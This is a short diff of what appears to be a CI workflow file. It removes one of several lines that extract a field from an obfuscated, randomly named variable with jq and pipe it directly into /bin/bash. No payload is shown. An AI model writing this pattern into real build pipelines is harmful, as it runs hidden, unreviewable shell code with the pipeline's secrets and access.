@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$xpz02" | jq -r .oj271 | /bin/bash
           echo $spu9 | jq -r .upzuk20 | /bin/bash
           echo $m9 | jq -r .ncbr535 | /bin/bash
-          echo $jbxes5346 | jq -r .b30 | /bin/bash
           echo $g31 | jq -r .iw613 | /bin/bash
 
       - name: Save output
